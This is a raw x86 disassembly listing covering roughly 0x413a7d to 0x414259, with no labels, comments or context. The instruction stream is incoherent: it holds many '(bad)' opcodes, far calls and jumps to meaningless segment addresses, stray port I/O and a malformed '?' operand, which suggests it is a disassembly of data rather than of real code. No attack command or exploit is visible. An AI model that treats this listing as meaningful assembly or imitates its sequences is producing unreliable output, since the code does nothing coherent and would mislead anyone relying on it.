  413a7d:	call   0x8f59:0xebcf7207
  413a84:	xchg   edx,eax
  413a85:	int    0x92
  413a87:	scas   eax,DWORD PTR es:[edi]
  413a88:	inc    ecx
  413a89:	les    ebx,FWORD PTR [esi+0x4a]
  413a8c:	mov    ebp,0x1681eb6
  413a91:	arpl   WORD PTR [ebx+ebp*2],bp
  413a94:	rcl    DWORD PTR [ecx-0x6926981a],cl
  413a9a:	imul   eax,DWORD PTR [esi+0xc48e68b],0x57d5ccb7
  413aa4:	jbe    0x413a3f
  413aa6:	ins    BYTE PTR es:[edi],dx
  413aa7:	add    edi,ebx
  413aa9:	out    dx,eax
  413aaa:	add    al,0x31
  413aac:	lds    eax,FWORD PTR [eax-0x3fcbf106]
  413ab2:	aaa    
  413ab3:	lock mov ch,0x62
  413ab6:	fs aad 0x2c
  413ab9:	jmp    0xe253:0x5e77656a
  413ac0:	rol    DWORD PTR ds:0xbd4ecade,1
  413ac6:	in     eax,dx
  413ac7:	aas    
  413ac8:	pusha  
  413ac9:	in     eax,dx
  413aca:	jge    0x413a6e
  413acc:	pop    edi
  413acd:	jne    0x413ac4
  413acf:	enter  0x179c,0xca
  413ad3:	shr    DWORD PTR [ebx-0x70],0x36
  413ad7:	not    BYTE PTR [esi+0x44b2b4c2]
  413add:	ret    
  413ade:	xchg   esp,eax
  413adf:	fcomp  st(2)
  413ae1:	pop    esi
  413ae2:	cmp    al,0xfb
  413ae4:	dec    edx
  413ae5:	xor    eax,0xa6a9261d
  413aea:	xchg   edi,eax
  413aeb:	mov    al,ds:0x35f0a8bf
  413af0:	lsl    esi,WORD PTR [edi]
  413af3:	mov    ah,0x16
  413af5:	ret    
  413af6:	je     0x413b13
  413af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413af9:	sti    
  413afa:	or     DWORD PTR [ebx-0x51],0x52
  413afe:	mov    ecx,0xfa29fecb
  413b03:	or     al,0x62
  413b05:	bound  ecx,QWORD PTR [ebx-0x58e57d0f]
  413b0b:	fcom   QWORD PTR [ebx+0x308d8197]
  413b11:	iret   
  413b12:	mov    bl,0xe2
  413b14:	(bad)  
  413b15:	xor    edx,eax
  413b17:	shr    DWORD PTR [ecx-0x5baea417],0x10
  413b1e:	xchg   edx,eax
  413b1f:	outs   dx,DWORD PTR ds:[esi]
  413b20:	scas   eax,DWORD PTR es:[edi]
  413b21:	cmp    esp,esi
  413b23:	mov    cl,0xb5
  413b25:	add    bh,bl
  413b27:	and    bl,BYTE PTR gs:[ebp+0x7268e553]
  413b2e:	xor    DWORD PTR [ebp-0x47],ecx
  413b31:	scas   eax,DWORD PTR es:[edi]
  413b32:	jno    0x413b52
  413b34:	mov    al,ds:0x3c4fadee
  413b39:	cld    
  413b3a:	mov    ecx,0xb1f88c5d
  413b3f:	enter  0xdf02,0x3f
  413b43:	xchg   ecx,eax
  413b44:	scas   eax,DWORD PTR es:[edi]
  413b45:	xlat   BYTE PTR ds:[ebx]
  413b46:	pop    es
  413b47:	inc    edi
  413b48:	mov    dh,0x82
  413b4a:	dec    ecx
  413b4b:	stc    
  413b4c:	(bad)  
  413b4d:	jns    0x413b97
  413b4f:	ins    BYTE PTR es:[edi],dx
  413b50:	lea    ecx,[ebx-0x4891e5c4]
  413b56:	and    ebx,DWORD PTR [ebp-0x3839352e]
  413b5c:	in     al,0x33
  413b5e:	gs adc al,0x7d
  413b61:	int    0xbc
  413b63:	pop    edx
  413b64:	ins    BYTE PTR es:[edi],dx
  413b65:	aad    0x2d
  413b67:	push   esp
  413b68:	retf   0xa2f4
  413b6b:	adc    bl,BYTE PTR [eax]
  413b6d:	sbb    ebp,DWORD PTR [ecx]
  413b6f:	fwait
  413b70:	(bad)  
  413b71:	or     BYTE PTR [edi],dh
  413b73:	call   0x4a00:0xc8903041
  413b7a:	add    al,0xd0
  413b7c:	mov    ebx,0x70cf8329
  413b81:	shl    DWORD PTR [edx+0xa627f16],cl
  413b87:	test   eax,0x5957d33f
  413b8c:	xchg   edx,eax
  413b8d:	sahf   
  413b8e:	cmp    bh,BYTE PTR [eax+0x6b]
  413b91:	imul   edx,DWORD PTR [ebp-0x52c0e95e],0xba7a68c2
  413b9b:	mov    BYTE PTR [edx],cl
  413b9d:	add    BYTE PTR [ecx-0x2c3978d9],dh
  413ba3:	ret    0x81bb
  413ba6:	out    0x17,al
  413ba8:	(bad)
  413bab:	xchg   esi,eax
  413bac:	mov    bh,0x35
  413bae:	(bad)  
  413baf:	fcom   DWORD PTR [ebx+eax*4+0x12]
  413bb3:	mov    ebp,0xffe81491
  413bb8:	fwait
  413bb9:	gs into 
  413bbb:	int3   
  413bbc:	mov    ecx,0x7a500115
  413bc1:	in     eax,dx
  413bc2:	or     al,0x20
  413bc5:	xchg   edi,eax
  413bc6:	mov    DWORD PTR [edi+0x2b856717],ebx
  413bcc:	mov    eax,ds:0x4ba72f46
  413bd1:	mov    cl,BYTE PTR [ebx]
  413bd3:	sub    BYTE PTR [ebp-0x5093847b],0x27
  413bda:	out    dx,al
  413bdb:	add    al,0xf4
  413bdd:	fbstp  TBYTE PTR [edx+0x7b]
  413be0:	xchg   esi,eax
  413be1:	stos   DWORD PTR es:[edi],eax
  413be2:	or     ebx,DWORD PTR [eax+0x7f1c6ce1]
  413be8:	int3   
  413be9:	xchg   esi,eax
  413bea:	jmp    0xf6a3a2f3
  413bef:	repz pop ds
  413bf1:	sbb    dl,dl
  413bf3:	and    DWORD PTR [ebx-0x3d42c821],edx
  413bf9:	pop    edi
  413bfa:	test   BYTE PTR [edx-0x5c037414],0x99
  413c01:	jle    0x413bab
  413c03:	pop    eax
  413c04:	(bad)  
  413c06:	xchg   edi,eax
  413c07:	lahf   
  413c08:	shr    DWORD PTR [ebx*4+0x31189979],0x70
  413c10:	out    dx,eax
  413c11:	stc    
  413c12:	lock aas 
  413c14:	mov    edi,0x7db798e2
  413c19:	xsaves [ebp-0x69d661e4]
  413c20:	mov    dl,BYTE PTR [edx]
  413c22:	jecxz  0x413c44
  413c24:	les    esp,FWORD PTR [esi]
  413c26:	popf   
  413c27:	dec    edx
  413c28:	shl    DWORD PTR [edi],cl
  413c2a:	xchg   ebp,eax
  413c2b:	and    BYTE PTR [edx],ch
  413c2d:	repz sbb BYTE PTR [edi-0x5d],0x65
  413c32:	push   cs
  413c33:	mov    ah,0x68
  413c35:	adc    WORD PTR [ebx-0x30],bx
  413c39:	add    BYTE PTR [ecx-0x4e],ch
  413c3c:	jne    0x413c8f
  413c3e:	cmp    BYTE PTR [edx+edi*4],ch
  413c41:	mov    ds:0x679125b7,eax
  413c46:	pop    eax
  413c47:	inc    edx
  413c48:	adc    cl,BYTE PTR fs:[ecx-0x684f5567]
  413c4f:	xchg   edi,eax
  413c50:	pop    eax
  413c51:	js     0x413c5e
  413c53:	and    cl,BYTE PTR [edi+0x19625298]
  413c59:	xor    eax,0x8dfb8401
  413c5e:	sbb    edx,DWORD PTR [eax+0x66]
  413c61:	sub    eax,0xf8ea9a00
  413c66:	mov    ds:0x151891f2,al
  413c6b:	pop    edx
  413c6c:	ja     0x413c8f
  413c6e:	xchg   edi,eax
  413c6f:	adc    eax,0x6775baea
  413c74:	xchg   edi,eax
  413c75:	add    eax,0xa25c4980
  413c7a:	push   ss
  413c7b:	sub    DWORD PTR [ebx+0xcb3e9e6],0xfafa4039
  413c85:	or     DWORD PTR [ebx-0x74f6d38d],edi
  413c8b:	push   0x59
  413c8d:	jmp    0x9ffa:0xae4618d3
  413c94:	dec    esp
  413c95:	push   ds
  413c96:	push   cs
  413c97:	pushf  
  413c98:	stos   BYTE PTR es:[edi],al
  413c99:	leave  
  413c9a:	dec    edi
  413c9b:	xor    eax,0xd06d497f
  413ca0:	jl     0x413cac
  413ca2:	ins    DWORD PTR es:[edi],dx
  413ca3:	sbb    al,0x79
  413ca5:	dec    eax
  413ca6:	lahf   
  413ca7:	jmp    0x413c76
  413ca9:	mov    ds:0x8d0a62,al
  413cae:	cmp    al,0xeb
  413cb0:	sbb    al,0x35
  413cb2:	add    DWORD PTR [edx-0x29],esi
  413cb5:	push   esp
  413cb6:	xchg   cl,ah
  413cb8:	push   edx
  413cb9:	xor    eax,0x6ca3bc97
  413cbe:	xchg   DWORD PTR [edx],eax
  413cc0:	dec    ebp
  413cc1:	(bad)  
  413cc2:	sbb    edx,DWORD PTR [esi+edi*4]
  413cc5:	out    0xd4,al
  413cc7:	loop   0x413c9e
  413cc9:	cmp    al,0xd
  413ccb:	int3   
  413ccc:	xchg   edi,eax
  413ccd:	outs   dx,DWORD PTR cs:[esi]
  413ccf:	cs mov DWORD PTR ss:[eax+ebx*8],ebx
  413cd4:	sub    DWORD PTR [edi],edi
  413cd6:	(bad)  
  413cd7:	into   
  413cd8:	push   esi
  413cd9:	pop    ss
  413cda:	sbb    edi,DWORD PTR [ecx+0x55]
  413cdd:	leave  
  413cde:	and    ebx,DWORD PTR [esp+ecx*8+0x51]
  413ce2:	xor    edx,edi
  413ce4:	sub    al,0x10
  413ce6:	into   
  413ce7:	or     DWORD PTR [edi+0x4d],ebp
  413cea:	xor    eax,0xfffa1812
  413cef:	hlt    
  413cf0:	xchg   edi,edx
  413cf2:	pop    es
  413cf3:	pop    ss
  413cf4:	into   
  413cf5:	inc    ebx
  413cf6:	icebp  
  413cf7:	hlt    
  413cf8:	imul   esp,esp,0xd
  413cfb:	inc    ebp
  413cfc:	mov    ecx,0xf51bef4
  413d01:	jae    0x413d4a
  413d03:	add    BYTE PTR [ebx+0x18],0x74
  413d07:	jecxz  0x413c9b
  413d09:	mov    edx,DWORD PTR [ebx-0x6b69a4aa]
  413d0f:	aam    0xab
  413d11:	sar    DWORD PTR [edx*1+0x2b197bff],0xcd
  413d19:	std    
  413d1a:	xchg   edx,eax
  413d1b:	sbb    DWORD PTR [edi-0x7d],ebx
  413d1e:	xchg   esi,eax
  413d1f:	shr    ch,1
  413d21:	out    0x55,al
  413d23:	sub    eax,0xd56614c8
  413d28:	jns    0x413d57
  413d2a:	loop   0x413d16
  413d2c:	mov    ebx,0xfe23f99e
  413d31:	push   ecx
  413d32:	xchg   edx,eax
  413d33:	shrd   DWORD PTR [ebp-0x6e],ecx,cl
  413d37:	mov    bh,0xa5
  413d39:	inc    ebx
  413d3a:	pop    ebp
  413d3b:	push   cs
  413d3c:	jge    0x413cc6
  413d3e:	adc    DWORD PTR [ecx-0x49319d9f],eax
  413d44:	ficomp WORD PTR [ecx-0x3fcd0b64]
  413d4a:	jne    0x413cf2
  413d4c:	call   0xf6eb:0x5d2c8efe
  413d53:	push   eax
  413d54:	cs (bad) 
  413d56:	ins    DWORD PTR es:[edi],dx
  413d57:	jecxz  0x413d20
  413d59:	pushf  
  413d5a:	(bad)  
  413d5b:	jmp    0x413d90
  413d5d:	mov    esi,0x62718329
  413d62:	ficomp WORD PTR [eax-0x1d33e219]
  413d68:	or     eax,0xdf67193a
  413d6d:	into   
  413d6e:	inc    ecx
  413d6f:	lods   al,BYTE PTR ds:[esi]
  413d70:	xor    DWORD PTR [esi-0x22],esp
  413d73:	push   ds
  413d74:	cld    
  413d75:	pop    es
  413d76:	mov    bh,0x1
  413d78:	jl     0x413d55
  413d7a:	add    al,0x3c
  413d7c:	push   edx
  413d7d:	mov    ebx,0xa20fbe43
  413d82:	jg     0x413ddb
  413d84:	and    eax,0xfb7a3529
  413d89:	das    
  413d8a:	ins    BYTE PTR es:[edi],dx
  413d8b:	jb     0x413dbd
  413d8d:	mov    cl,0xad
  413d8f:	adc    al,0x38
  413d91:	push   ecx
  413d92:	pmaxsw mm5,QWORD PTR [edx-0x6d]
  413d96:	cmp    dl,bl
  413d98:	sub    eax,0x75b8b944
  413d9d:	xchg   DWORD PTR gs:[edx-0x4666d39f],esi
  413da4:	inc    ebp
  413da5:	stos   BYTE PTR es:[edi],al
  413da6:	mov    dl,0xa2
  413da8:	mov    eax,0x614396c1
  413dad:	xchg   esi,eax
  413dae:	sbb    ebp,eax
  413db0:	hlt    
  413db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413db2:	jg     0x413dae
  413db4:	sbb    al,0x55
  413db6:	fidiv  WORD PTR [ecx+0x40b3659a]
  413dbc:	data16 int3 
  413dbe:	imul   ebx,DWORD PTR ds:0x23b37c3e,0xa43dad75
  413dc8:	icebp  
  413dc9:	sub    eax,0xd8dee691
  413dce:	repnz sub eax,0xd7c65089
  413dd4:	push   esp
  413dd5:	pop    ebx
  413dd6:	pcmpeqd mm0,QWORD PTR [ecx]
  413dd9:	mov    dh,0xa2
  413ddb:	adc    eax,0xe9bc04
  413de0:	dec    ebp
  413de1:	dec    ebx
  413de2:	inc    ebp
  413de3:	loopne 0x413d79
  413de5:	inc    eax
  413de6:	jo     0x413e3a
  413de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413de9:	mov    eax,ds:0xe5528847
  413dee:	(bad)  
  413def:	repnz out dx,eax
  413df1:	in     eax,dx
  413df2:	dec    esp
  413df3:	push   0xffffffa0
  413df5:	gs mov esp,0x765d3c1d
  413dfb:	or     esp,DWORD PTR [ebx]
  413dfd:	ins    DWORD PTR es:[edi],dx
  413dfe:	mov    bl,0xb7
  413e00:	push   ebx
  413e01:	div    al
  413e03:	es imul ecx
  413e06:	add    bh,BYTE PTR [ebx-0x6]
  413e09:	cmp    ebp,DWORD PTR [ebx-0x516c40ca]
  413e0f:	xchg   esp,eax
  413e10:	pop    eax
  413e11:	mov    esi,0xb58a2d4e
  413e16:	adc    edi,DWORD PTR [ebx+0x60]
  413e19:	fidiv  DWORD PTR [edx]
  413e1b:	add    eax,0x6921365c
  413e20:	cmp    DWORD PTR [edx+eax*1],ecx
  413e23:	xchg   edi,eax
  413e24:	jno    0x413e71
  413e26:	mov    ds:0x1dce92e5,al
  413e2b:	xchg   BYTE PTR [ebp+0x8b49c34],al
  413e31:	icebp  
  413e32:	iret   
  413e33:	fwait
  413e34:	pop    eax
  413e35:	push   0x4a
  413e37:	js     0x413dc0
  413e39:	jae    0x413e36
  413e3b:	jae    0x413dda
  413e3d:	cmp    al,0xf4
  413e3f:	dec    ebx
  413e40:	pop    ebp
  413e41:	inc    esp
  413e42:	pushf  
  413e43:	loop   0x413e94
  413e45:	out    0x1a,eax
  413e47:	imul   ebp,ebp,0xb26c822e
  413e4d:	adc    BYTE PTR [edx],dl
  413e4f:	cwde   
  413e50:	into   
  413e51:	fnstcw WORD PTR [edx]
  413e53:	push   ebx
  413e54:	scas   al,BYTE PTR es:[edi]
  413e55:	adc    al,0x9b
  413e57:	push   esi
  413e58:	je     0x413dec
  413e5a:	ja     0x413ec0
  413e5c:	cld    
  413e5d:	dec    ebx
  413e5e:	adc    dl,BYTE PTR [esi+0x36]
  413e61:	pushf  
  413e62:	dec    ebp
  413e63:	aad    0x91
  413e65:	inc    edi
  413e66:	sti    
  413e67:	call   0x3c57ee94
  413e6c:	repnz push edi
  413e6e:	popf   
  413e6f:	call   0xc047:0x855e72bc
  413e76:	mov    bh,0x5f
  413e78:	imul   edx,DWORD PTR [edi-0xcb79bd1],0x37
  413e7f:	mov    ah,0x87
  413e81:	stc    
  413e82:	cwde   
  413e83:	mov    ch,ah
  413e85:	jl     0x413e3b
  413e87:	daa    
  413e88:	mov    esi,0xd3d64b74
  413e8d:	pop    ss
  413e8e:	int3   
  413e8f:	adc    BYTE PTR [ebp+0x3],dh
  413e92:	test   dh,al
  413e94:	pop    ecx
  413e95:	and    DWORD PTR [esp+ebp*8+0x666d37a1],esi
  413e9c:	sar    BYTE PTR [edx+0x2c],0xca
  413ea0:	lea    esp,[ecx-0x77]
  413ea3:	je     0x413f1a
  413ea5:	xchg   esp,eax
  413ea6:	rol    DWORD PTR [ebx],cl
  413ea8:	mov    bl,0x17
  413eaa:	inc    esp
  413eab:	xchg   edx,eax
  413eac:	pop    es
  413ead:	sbb    dl,ch
  413eaf:	cmp    BYTE PTR [esi+edi*8],ch
  413eb2:	ja     0x413f1b
  413eb4:	add    DWORD PTR [ecx-0x13d92d],edi
  413eba:	nop
  413ebb:	fwait
  413ebc:	das    
  413ebd:	dec    ebp
  413ebe:	fmulp  st(4),st
  413ec0:	mov    cl,0x5e
  413ec2:	xchg   ebx,eax
  413ec3:	mov    ebp,0x2da25fe1
  413ec8:	or     eax,DWORD PTR [ecx-0x3d9ceeb7]
  413ece:	out    dx,eax
  413ecf:	mov    ds:0xdf95e7f3,eax
  413ed4:	out    0x98,al
  413ed6:	ret    
  413ed7:	fs mov edi,0x44dd36d9
  413edd:	mov    edx,0x201434f9
  413ee2:	xor    esi,DWORD PTR [edi+0x312faea1]
  413ee8:	xchg   edx,eax
  413ee9:	inc    eax
  413eea:	push   ebp
  413eeb:	imul   edi,esp,0x6e
  413eee:	imul   ecx,DWORD PTR [ecx],0x67
  413ef1:	out    dx,eax
  413ef2:	mov    ss:0xf3d2c5d6,al
  413ef8:	test   al,0x3a
  413efa:	repnz adc eax,0x8a178be3
  413f00:	sub    BYTE PTR [edx+0x40],ch
  413f03:	into   
  413f04:	out    dx,al
  413f05:	xchg   ebx,eax
  413f06:	arpl   WORD PTR [ebp+0x7c],di
  413f09:	sub    edx,edi
  413f0b:	pusha  
  413f0c:	addr16 mov esi,0x393b150f
  413f12:	xchg   ebp,eax
  413f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f14:	push   ecx
  413f15:	ror    BYTE PTR [ecx],cl
  413f17:	xor    al,BYTE PTR [ecx-0x2c23b83a]
  413f1d:	mov    esi,0x1058db2
  413f22:	push   ecx
  413f23:	cmp    eax,0xd9d93411
  413f28:	shl    DWORD PTR [esi+0xd],0xae
  413f2c:	mov    al,0x1d
  413f2e:	ror    BYTE PTR [edi],0xa8
  413f31:	test   cl,ch
  413f33:	mov    BYTE PTR [ecx],bl
  413f35:	sbb    al,0xa4
  413f37:	xchg   edx,eax
  413f38:	mov    edx,0x84fd4f4a
  413f3d:	les    ebx,FWORD PTR [edi]
  413f3f:	adc    bl,BYTE PTR [ebx-0x1b]
  413f42:	adc    DWORD PTR [ebp+0xe44a4a],ebp
  413f48:	mul    BYTE PTR [eax+0x2a]
  413f4b:	aad    0xa2
  413f4d:	mov    ebx,0xcf99f851
  413f52:	adc    BYTE PTR [edx-0x58],ah
  413f55:	aaa    
  413f56:	loope  0x413f19
  413f58:	adc    ah,BYTE PTR [esi-0x262e8e82]
  413f5e:	mov    al,BYTE PTR [ebx]
  413f60:	(bad)  [esi+0x61]
  413f63:	push   ecx
  413f64:	mov    al,ds:0xb30c7c92
  413f69:	xchg   edi,eax
  413f6a:	enter  0xdeaf,0xd9
  413f6e:	pusha  
  413f6f:	dec    edi
  413f70:	xlat   BYTE PTR ds:[ebx]
  413f71:	xor    ebx,ecx
  413f73:	hlt    
  413f74:	loop   0x413f59
  413f76:	push   ds
  413f77:	add    ecx,DWORD PTR [edx-0x39]
  413f7a:	sbb    eax,0xe1bbff2e
  413f7f:	jmp    0x413f9f
  413f81:	aam    0xed
  413f83:	iret   
  413f84:	js     0x413f6d
  413f86:	pop    esp
  413f87:	fnstsw WORD PTR [edi-0x1ba2dc9e]
  413f8d:	in     al,dx
  413f8e:	sub    eax,0x2c83fe8b
  413f93:	or     al,0xe4
  413f95:	mov    al,0x5e
  413f97:	loope  0x41400e
  413f99:	or     ch,bh
  413f9b:	scas   al,BYTE PTR es:[edi]
  413f9c:	push   edi
  413f9d:	imul   edi,DWORD PTR [edx-0x51],0xafd91085
  413fa4:	inc    ebp
  413fa5:	push   eax
  413fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fa7:	xor    eax,0xc9721da7
  413fac:	adc    DWORD PTR [ecx],ebp
  413fae:	and    DWORD PTR [edi+0x29952232],ebp
  413fb4:	add    dl,BYTE PTR [ecx-0x7c7d076f]
  413fba:	cld    
  413fbb:	clc    
  413fbc:	cmc    
  413fbd:	or     DWORD PTR [esp+ebx*8-0x61],esp
  413fc1:	xor    bh,bl
  413fc3:	shl    DWORD PTR [edx-0x1136cbe2],1
  413fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fca:	dec    eax
  413fcb:	jecxz  0x413fc0
  413fcd:	mov    ecx,0x84488f2e
  413fd2:	aam    0x6e
  413fd4:	fistp  QWORD PTR [eax]
  413fd6:	add    al,0x4f
  413fd8:	pop    ds
  413fd9:	popa   
  413fda:	mov    esp,DWORD PTR [ecx+0x69]
  413fdd:	add    DWORD PTR [ebx],ebp
  413fdf:	div    ebx
  413fe1:	retf   
  413fe2:	and    eax,0x6d6ab82b
  413fe7:	and    edx,edx
  413fe9:	jne    0x41405a
  413feb:	jmp    0x41401b
  413fed:	mov    ch,0xa0
  413fef:	pop    edx
  413ff0:	rol    DWORD PTR [ebx+0x41c012b2],1
  413ff6:	dec    esp
  413ff7:	and    al,0x88
  413ff9:	sub    eax,0x7db5e9f8
  413ffe:	mov    ds,WORD PTR [eax]
  414000:	mov    ah,0x7d
  414002:	aad    0x1
  414004:	mov    DWORD PTR [ebp-0x338a7920],esp
  41400a:	sahf   
  41400b:	enter  0x9c18,0x6f
  41400f:	mov    eax,ds:0xa8e40890
  414014:	rcl    DWORD PTR [ebp-0x5ae0d780],cl
  41401a:	mov    cl,0x7d
  41401c:	push   ebx
  41401d:	jecxz  0x413fcd
  41401f:	xchg   ecx,eax
  414020:	push   esi
  414021:	fidiv  WORD PTR [ebp-0x3f7b9d28]
  414027:	mov    dl,0x84
  414029:	dec    ebx
  41402a:	daa    
  41402b:	and    bh,BYTE PTR [ebx]
  41402d:	gs mov ecx,0x2befe137
  414033:	inc    ebx
  414034:	bound  ebp,QWORD PTR [eax]
  414036:	stos   BYTE PTR es:[edi],al
  414037:	(bad)  
  414038:	aaa    
  414039:	adc    edx,DWORD PTR ds:0x5656e019
  41403f:	push   ds
  414040:	add    DWORD PTR es:[esi-0x66],edi
  414044:	sbb    BYTE PTR [ebp-0x1d],bl
  414047:	loop   0x413fe4
  414049:	push   ebp
  41404a:	and    al,dh
  41404c:	cli    
  41404d:	add    BYTE PTR [eax-0x1e3c9d01],ah
  414053:	cld    
  414054:	push   0x7a
  414056:	jb     0x414068
  414058:	loope  0x41404d
  41405a:	enter  0xcc76,0xd9
  41405e:	fiadd  DWORD PTR [bp+0x39b3]
  414064:	mov    al,ds:0x4fbfcd37
  414069:	rcl    DWORD PTR [edx-0xf],0xcd
  41406d:	mov    ebp,0xaf067633
  414072:	and    DWORD PTR [ebp+ebx*2-0x3d46be44],edi
  414079:	add    BYTE PTR ds:0x9c16ef2f,bh
  41407f:	or     esp,DWORD PTR [ebx-0x5d5b2e7a]
  414085:	adc    ecx,DWORD PTR [eax+0x4db180c8]
  41408b:	stc    
  41408c:	(bad)  
  41408d:	xchg   ecx,eax
  41408e:	and    bh,BYTE PTR ds:0x74a76b73
  414094:	sub    esp,edx
  414096:	push   esp
  414097:	pop    edi
  414098:	pop    eax
  414099:	fdivrp st(6),st
  41409b:	fcomi  st,st(0)
  41409d:	mov    dh,0x5c
  41409f:	inc    ebp
  4140a0:	mov    esi,0x76751a5f
  4140a5:	inc    esp
  4140a6:	cwde   
  4140a7:	scas   al,BYTE PTR es:[edi]
  4140a8:	add    DWORD PTR [edi-0x6e],eax
  4140ab:	add    BYTE PTR ds:0xa1928b36,cl
  4140b1:	xchg   DWORD PTR [eax-0x37],edx
  4140b4:	and    BYTE PTR [edx+eiz*8+0x591fb6bc],dh
  4140bb:	sbb    esp,ebx
  4140bd:	sbb    ecx,esp
  4140bf:	test   eax,0x435ed16
  4140c4:	pop    ss
  4140c5:	dec    esi
  4140c6:	rcl    edx,1
  4140c8:	sbb    DWORD PTR [esi],ebx
  4140ca:	xor    eax,0xe00b6915
  4140cf:	in     al,0xac
  4140d1:	(bad)  
  4140d2:	or     eax,0x73964326
  4140d7:	in     eax,0xc4
  4140d9:	xor    eax,0x520325c3
  4140de:	loop   0x414124
  4140e0:	and    DWORD PTR [ebx+0x6c631e7c],edx
  4140e6:	pushf  
  4140e7:	jecxz  0x41414d
  4140e9:	xor    DWORD PTR [edi+0x5c],edx
  4140ec:	mov    edi,0xc1e069bd
  4140f1:	(bad)  
  4140f2:	outs   dx,DWORD PTR ds:[esi]
  4140f3:	test   ah,cl
  4140f5:	arpl   WORD PTR [edi-0x19],dx
  4140f8:	das    
  4140f9:	call   0xacc8:0xb308dcb7
  414100:	(bad)  [esi]
  414102:	stos   DWORD PTR es:[edi],eax
  414103:	repz push 0x8bfdcb0e
  414109:	ficomp DWORD PTR [ecx-0x45e2fce8]
  41410f:	rol    BYTE PTR [edi],0x63
  414112:	inc    edi
  414113:	pop    ebp
  414114:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  414116:	mov    esp,0x6c9ddce4
  41411b:	add    BYTE PTR [esi],ch
  41411d:	pop    DWORD PTR [ecx-0x5719ad7c]
  414123:	call   0x85c3e555
  414128:	cmp    DWORD PTR [edx+0xd],esp
  41412b:	and    al,0xd9
  41412d:	adc    BYTE PTR [edi-0x26235fc1],0x32
  414134:	jl     0x414170
  414136:	adc    edi,DWORD PTR [ebx]
  414138:	lods   eax,DWORD PTR ds:[esi]
  414139:	add    eax,0x3d31c424
  41413e:	leave  
  41413f:	sahf   
  414140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414141:	push   ds
  414142:	add    DWORD PTR [ebx],0xffffffc8
  414145:	es fdiv st(6),st
  414148:	ret    
  414149:	outs   dx,BYTE PTR ds:[esi]
  41414a:	arpl   WORD PTR [edx-0x26],bx
  41414d:	(bad)  
  41414e:	inc    ebx
  41414f:	test   BYTE PTR [esi+0x678780d5],ah
  414155:	mov    WORD PTR [ecx],es
  414157:	js     0x4141c6
  414159:	pop    edx
  41415a:	daa    
  41415b:	aas    
  41415c:	sub    DWORD PTR [ecx+0x45],ecx
  41415f:	sub    ecx,DWORD PTR [edi]
  414161:	fnstsw WORD PTR [ecx-0x32]
  414164:	mov    ecx,0x2c6a53ba
  414169:	hlt    
  41416a:	inc    ebx
  41416b:	call   0x668d:0x79fceb7f
  414172:	into   
  414173:	mov    ecx,0x6ace4624
  414178:	int    0xdf
  41417a:	and    DWORD PTR [ecx-0x31],esi
  41417d:	lods   al,BYTE PTR ds:[esi]
  41417e:	pop    ebp
  41417f:	jle    0x414200
  414181:	jge    0x4141fe
  414183:	dec    edx
  414184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414185:	pop    edx
  414186:	mov    bh,0x37
  414188:	stos   DWORD PTR es:[edi],eax
  414189:	(bad)
  41418c:	(bad)  
  41418d:	jne    0xbf74f480
  414193:	push   0xf13a6d7d
  414198:	(bad)  
  414199:	(bad)  
  41419a:	inc    bl
  41419c:	or     eax,0x5a58b7cd
  4141a1:	(bad)  
  4141a2:	retf   
  4141a3:	iret   
  4141a4:	int    0x26
  4141a6:	popf   
  4141a7:	inc    esp
  4141a8:	pop    eax
  4141a9:	xlat   BYTE PTR ds:[ebx]
  4141aa:	mov    edi,0xb8219ac8
  4141af:	retf   0xfe73
  4141b2:	call   0x835bd628
  4141b7:	les    eax,FWORD PTR [eax-0x62]
  4141ba:	dec    ebp
  4141bb:	aaa    
  4141bc:	pop    ss
  4141bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141be:	push   ds
  4141bf:	mov    edi,0xd6e8fc9a
  4141c4:	dec    ebx
  4141c5:	leave  
  4141c6:	test   al,ch
  4141c8:	push   ebp
  4141c9:	sbb    ebx,DWORD PTR [eax+0x7f0fe2ad]
  4141cf:	stc    
  4141d0:	pop    ebx
  4141d1:	out    0xf6,eax
  4141d3:	stos   BYTE PTR es:[edi],al
  4141d4:	mov    dh,0xe1
  4141d6:	mov    eax,ds:0xcae88c4b
  4141db:	retf   0x272c
  4141de:	push   esi
  4141df:	dec    ecx
  4141e0:	xcrypt-ctr (bad)
  4141e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141e2:	lahf   
  4141e3:	daa    
  4141e4:	dec    eax
  4141e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141e6:	cld    
  4141e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141e8:	scas   al,BYTE PTR es:[edi]
  4141e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ea:	out    0x25,al
  4141ec:	pusha  
  4141ed:	fild   DWORD PTR [eax+0x24bbf5ab]
  4141f3:	cmp    BYTE PTR [edx+0x15b7d977],cl
  4141f9:	ja     0x41424e
  4141fb:	ficom  WORD PTR [edx+0x82f5445]
  414201:	jp     0x41427e
  414203:	and    DWORD PTR [eax],0xffffff8a
  414206:	xor    DWORD PTR [edi],ecx
  414208:	ds dec edx
  41420a:	ret    0xa766
  41420d:	(bad)  
  41420f:	cli    
  414210:	call   0xab55fb02
  414215:	arpl   si,di
  414217:	dec    ecx
  414218:	or     eax,0x33b172d1
  41421d:	and    al,0x2
  41421f:	imul   edx,DWORD PTR [edi+0x1a],0x62c60e3c
  414226:	push   ss
  414227:	mov    ch,0xc9
  414229:	je     0x4141d3
  41422b:	mov    dl,0x64
  41422d:	arpl   WORD PTR [eax+0x0],bp
  414230:	and    ecx,DWORD PTR [eax-0x10eb36d0]
  414236:	sub    esp,DWORD PTR [ebp+0x5322a85e]
  41423c:	ins    DWORD PTR es:[edi],dx
  41423d:	das    
  41423e:	mov    ebx,0x836778d
  414243:	inc    edx
  414244:	push   edi
  414245:	add    bh,bl
  414247:	mov    WORD PTR [esi-0x41],?
  41424a:	fist   WORD PTR [ecx]
  41424c:	mov    edi,0xc2111304
  414251:	shr    DWORD PTR [ebx+0x71265662],cl
  414257:	mov    dh,0xe1
  414259:	push   esi
